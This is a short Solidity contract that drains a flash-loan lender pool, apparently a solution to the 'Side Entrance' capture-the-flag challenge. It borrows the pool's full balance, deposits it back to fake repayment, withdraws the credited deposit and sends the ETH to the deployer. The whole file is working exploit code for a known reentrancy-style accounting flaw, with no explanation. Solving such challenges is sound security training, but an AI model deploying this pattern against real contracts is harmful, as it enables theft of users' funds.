// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external payable;
}

contract SideEntranceLenderPoolExploit {
    using Address for address payable;

    address private immutable owner;
    ISideEntranceLenderPool public immutable pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function runExploit() external {
        uint256 balance = address(pool).balance;
        pool.flashLoan(balance);
        pool.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
